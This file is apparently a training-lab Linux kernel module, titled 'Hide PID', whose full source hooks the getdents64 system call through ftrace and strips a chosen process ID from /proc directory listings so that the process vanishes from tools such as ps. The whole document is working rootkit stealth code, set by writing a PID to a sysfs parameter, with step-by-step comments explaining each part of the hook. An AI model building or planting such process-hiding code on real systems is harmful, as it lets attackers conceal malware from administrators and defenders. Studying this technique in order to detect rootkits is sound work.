/* 
 * LAB: Stealth / Hiding processes / Hide PID 
*/

#define pr_fmt(fmt) "%s: " fmt, KBUILD_MODNAME

#include <linux/module.h>
#include <asm/uaccess.h>  // strncpy_from_user()
#include <linux/slab.h> // kmalloc()/kfree()
#include <linux/ftrace.h> // register_ftrace_function()/unregister_ftrace_function()
#include <linux/dirent.h> // linux_dirent64
#include <linux/file.h> // fget_raw

int init_function(void);
void exit_function (void);
module_init (init_function);
module_exit (exit_function);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kernel Ninjas LLC");
MODULE_DESCRIPTION("Hide PID");

// typedefs
typedef long (*sys_getdents64_t)(struct pt_regs *regs);

// structures
struct hide_pid_context {
    void* original_function;
    void* hooked_function;
    struct ftrace_ops ops;
};

// forward declaration
void notrace ftrace_callback (
    unsigned long ip, // Instruction pointer (RIP) of the function that is being traced
    unsigned long parent_ip, // Caller's instruction pointer (RIP)
    struct ftrace_ops *ops, // Pointer to ftrace_ops that was used to register the callback
    struct ftrace_regs *fregs); // Pointer to the pt_regs structure
long hide_pid_hook_getdents64(struct pt_regs *regs);
int hide_pid_process_dirent(char *buffer, int length );
int hide_pid_set (const char *val, const struct kernel_param *kp);

// globals

// echo "<PID>" > /sys/module/hide_pid/parameters/pid_to_hide
// module parameter structure used to register callbacks
struct kernel_param_ops  hide_pid_ops = {
    .set = hide_pid_set,    // custom setter
    .get = param_get_int,   // standard getter
};

// module parameters - pid_to_hide
#define PID_STRLEN  20
static char pid_to_hide_string[PID_STRLEN] = {0};
static int pid_to_hide = 0;
module_param_cb(pid_to_hide, &hide_pid_ops, &pid_to_hide, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(pid_to_hide, "PID to hide");


// global context
struct hide_pid_context g_context = {0};

// Custom setter used to cover numeric PID to string PID
int hide_pid_set (const char *val, const struct kernel_param *kp) {
    int res;

    // Call the helper function param_[set|get]_xxx() to set the variable
    res = param_set_int(val, kp);
    if ( res < 0 ) {
        pr_info("param_set_int() FAILED\n"); 
        return -1;
    }

    // Convert the PID to a string for comparison purposes
    snprintf(pid_to_hide_string, sizeof(pid_to_hide_string), "%u", 
        pid_to_hide);
    pr_info("pid_to_hide_string=%s\n", pid_to_hide_string);

    return 0;
} // hide_pid_set()

// Generic ftrace callback - interception function agnostic
void notrace ftrace_callback (
    unsigned long ip, // Instruction pointer (RIP) of the function that is being traced
    unsigned long parent_ip, // Caller's instruction pointer (RIP)
    struct ftrace_ops *ops, // Pointer to ftrace_ops that was used to register the callback
    struct ftrace_regs *fregs) { // Pointer to the pt_regs structure

    // Retrieve the global context from the ftrace_ops structure
    struct hide_pid_context *context = ops->private;
    struct pt_regs* regs = ftrace_get_regs(fregs);
    unsigned long module_begin;
    unsigned long module_end;

    pr_info("%s: ip=0x%lx(%pS) parent_ip=0x%lx(%pS)\n", __func__, 
        ip, (void*)ip,
        parent_ip, (void*)parent_ip);

    // Save the original RIP to call the original function
    // This avoids looking up the symbol of the original function
    context->original_function = (void*)ip;

    // Step #1:
    // Get the extent of the current module in KVAS and 
    // store the module base in module_begin and
    // store the module end in module_end
    module_begin = (unsigned long)THIS_MODULE->core_layout.base;
    module_end = module_begin + THIS_MODULE->core_layout.size;

    // Step #2:
    // Perform a bounds check
    // If the caller is within the current module, skip the rest of the 
    // process to avoid recursively reentering the original function
    if ( ( parent_ip >= module_begin && parent_ip <= module_end ) ) {
        pr_info("%s: module_begin=0x%lx module_end=0x%lx SKIP\n", __func__,  
            module_begin, module_end);
        return;
    }

    // Step #3:
    // Transfer execution control to the hook function
    // By setting the RIP to the hooked function
    regs->ip = (unsigned long)context->hooked_function;
} // ftrace_callback()


// long sys_getdents64(
//     unsigned int fd, //edi
//     struct linux_dirent64 *dirent, //rsi
//     unsigned int count); // edx
// Called from ftrace_generic_callback() using IP redirection
long hide_pid_hook_getdents64(struct pt_regs *regs) {

    struct hide_pid_context *context = &g_context;

    // SYSCALL parameters
    int fd = (int)regs->di; 
    struct linux_dirent64 __user* dirent = (struct linux_dirent64*)regs->si; 
    unsigned int count = (int)regs->dx;

    // retrun value from getdents64() = number of bytes read 
    int retval; 

    // for directory name filtering
    struct file* file;
    char *path;
    char buffer[64];

    // for content filtering
    char *kernel_bufptr = NULL;
    int kernel_buflen; // original size of directory listing buffer
    int kernel_newlen; // size of the kernel buffer after manipulation
    unsigned long remaining; // result of copy_to_user()

    // Call the original getdents64() through hide_pid_context.original_function
    // hide_pid_context.original_function has been set in ftrace_callback()
    retval  = ((sys_getdents64_t)context->original_function)(regs);
    pr_info("%s: fd=%u dirent=%px count=%u retval=%d\n", __func__, 
        fd, dirent, count, retval);
    if ( (retval == 0) || // no data retruned
        (retval < 0) ) { // check for failure
        // if the directory query failed or it there is no data 
        // then there is nothing to process
        goto exit;
    }

    // Step #4:
    // Obtain the struct file* for the directory represented by the fd parameter
    // and store the result in the local variable file
    file = fget_raw(fd); // struct file *fget_raw(unsigned int fd);
    if ( !file ) {
        goto exit;
    }
    pr_info("%s: file=%px\n", __func__, file);

    // Step #5:
    // Get the path to the directory being queried and store
    // the result in path.
    // Use buffer[] to query the directory path
    path = d_path(&file->f_path, buffer, sizeof(buffer));
    if ( IS_ERR(path) ) {
        goto exit;
    }
    pr_info("%s: dir=%s\n", __func__, path);

    // Step #6:
    // Check if the directory being enumerated is the /proc.
    if ( strcmp(path, "/proc") != 0 ) {
        goto exit;
    }

    // Set kernel_buflen to the length of the original user space buffer
    kernel_buflen = retval;

    // Step #7:
    // Allocate a kernel buffer of size kernel_buflen to read the 
    // directory contents from userspace and store the pointer in kernel_bufptr
    kernel_bufptr = (char*)kmalloc(kernel_buflen, GFP_KERNEL);
    if (!kernel_bufptr) {
        goto exit;
    }

    // Step #8:
    // Copy the directory contents from userspace (dirent) 
    // to the kernel mode buffer in kernel_bufptr.
    // kernel_buflen is the length of the buffer
    remaining = copy_from_user(kernel_bufptr, dirent, kernel_buflen);
    if ( remaining != 0 ) {
        pr_info("%s: copy_from_user() FAILED=%ld\n", __func__, remaining);
        goto exit;
    }

    // Manipulate the directory entries in the kernel buffer
    // kernel_newlen is the size of the manipulated buffer
    kernel_newlen = hide_pid_process_dirent(kernel_bufptr, kernel_buflen);

    // Step #9:
    // Copy the manipulated kernel buffer in kernel_bufptr 
    // back to the user space buffer in dirent 
    // using kernel_newlen as the length of the buffer
    remaining = copy_to_user(dirent, kernel_bufptr, kernel_newlen);
    if ( remaining != 0 ) {
        pr_info("%s: copy_to_user() FAILED=%ld\n", __func__, remaining);
        goto exit;
    }

    retval = kernel_newlen;

exit: 
    // resource cleanup
    // Step #10:
    // Free the kernel buffer in kernel_bufptr
    // if the buffer is valid
    if (kernel_bufptr) {
         kfree(kernel_bufptr);
    }

    // return the original or manipulated length
    return retval;
} // hide_pid_hook_getdents64()

// Manipulates the kernel buffer to remove the entry to be hidden
// Return value is the number of bytes in the buffer after manipulation
int hide_pid_process_dirent(char *buffer, int length ) {

    struct linux_dirent64* dirent = (struct linux_dirent64*)buffer;
    struct linux_dirent64* prevent = NULL; // previous linux_dirent64
    struct linux_dirent64* nextent = NULL; // next linux_dirent64
    unsigned long total = 0; // sum of all linux_dirent64.d_reclen
    int i; 

    // Step #11:
    // Loop through all the linux_dirent64 entries in buffer using the 
    // dirent, prevent and nextent as the trackers for 
    // the current, previous and next entries respectively
    // Stop when the aggregate length of all the entries (total) 
    // matches or exceeds the buffer length provided to the caller (length)
    // Compare each directory entry name to the PID in pid_to_hide_string[]
    // If a match is found, the entry must be removed, as follows:
    // -For the first entry move everything else up to overwrite the matching entry
    //  return the reduced buffer size to the caller using the return value
    // -For other entries adjust the d_reclen of the previous entry to skip over
    //  the matching entry.
    for (i=0 ; ; i++) {
        unsigned short reclen;

        // Cache the length of the current entry
        reclen = dirent->d_reclen;
        nextent = (struct linux_dirent64 *) ((char *)dirent + reclen);

        // Does this directory entry need to be hidden?
        if ( strcmp ( pid_to_hide_string, dirent->d_name ) == 0 ) {
            // Dump the entry
            pr_info("%s: MATCH [%u] d_ino=%llu d_off=%lld d_reclen=%u d_type=%02x [%s]\n", 
                __func__, 
                i,
                dirent->d_ino,
                dirent->d_off,
                dirent->d_reclen,
                dirent->d_type,
                dirent->d_name );

            // remove the entry
            if ( prevent ) {
                // This is not the first entry
                // bump up the length of the previous entry
                // to skip over the current entry
                prevent->d_reclen += dirent->d_reclen;
                return length; // No change to the aggregate buffer size
            } else {
                // This is the first entry
                // Move everything else up to make the next entry the first one 
                int bytes_moved = length - dirent->d_reclen;
                memmove(buffer, (char *)nextent, bytes_moved);
                return bytes_moved; // Return the reduced length of the buffer
            }
        }

        // Move over to the next entry
        prevent = dirent;
        dirent = nextent;

        // Bump up the total bytes consumed
        total += reclen;

        if (total >= length) {
            break;
        }
    }

    // Return the total length of the buffer after manipulation
    return total;
} // hide_pid_process_dirent()


bool hide_pid_init  (struct hide_pid_context *context) {
    int err;

    // original_function is captured from the IP parameter in ftrace_callback()
    context->original_function = NULL;
    // hooked_function to redirect execution to from ftrace_callback()
    context->hooked_function = hide_pid_hook_getdents64;

    // Step #12: 
    // Initialize the ftrace_ops structure which will be used to register with ftrace
    // Use the appropriate flags to indicate that :
    // -registers must be saved and
    // -ftrace callback will modify the instruction pointer
    context->ops.func = ftrace_callback;
    context->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
    context->ops.private = context;

    // Step #13:
    // Set a ftrace filter for "__x64_sys_getdents64"
    err = ftrace_set_filter( 
        &context->ops, 
        "__x64_sys_getdents64", 
        strlen("__x64_sys_getdents64"), 1);
    if (err) {
        pr_info("%s: ftrace_set_filter(__x64_sys_getdents64) : ERROR=%d\n", __func__, err );
        goto error;
    }
    pr_info("%s: ftrace_set_filter(__x64_sys_getdents64) : OK\n", __func__);

    // Step #14:
    // Register the ftrace_ops strcuture to start ftracing
    err = register_ftrace_function(&context->ops);
    if(err < 0) {
        pr_info("%s: register_ftrace_function() : ERROR=%d\n", __func__, err );
        goto error;
    }
    pr_info("%s: register_ftrace_function() : OK\n", __func__);

    return true;

error:
    return false;
}

bool hide_pid_exit (struct hide_pid_context *context) {
    int err;

    // Step #15:
    // Deregister the ftrace callback and 
    // ensure that the callback is no longer invoked.
    err = unregister_ftrace_function(&context->ops);
    if(err < 0) {
        pr_info("%s: unregister_ftrace_function() : ERROR=%d\n", __func__, err );
    } else {
        pr_info("%s: unregister_ftrace_function() : OK\n", __func__);
    }

    // Step #16:
    // Remove the original function from ftrace
    err = ftrace_set_filter(&context->ops, NULL, 0, 1);
    if (err < 0) {
        pr_info("%s: ftrace_set_filter(remove=ALL) : ERROR=%d\n", __func__, err);
    } else {
        pr_info("%s: ftrace_set_filter(remove=ALL) : OK\n", __func__);
    }

    return true;
} // hide_pid_exit()

int init_function(void) {
    struct hide_pid_context *context = &g_context;

    pr_info("%s Built on %s %s\n", __func__, __DATE__, __TIME__ );

    if ( ! hide_pid_init(context) ) {
        goto error_exit;
    }

error_exit:
    return 0;
} // init_function()

void exit_function (void) {
    struct hide_pid_context *context = &g_context;

    hide_pid_exit(context);

    pr_info("%s\n", __func__);
} // exit_function()
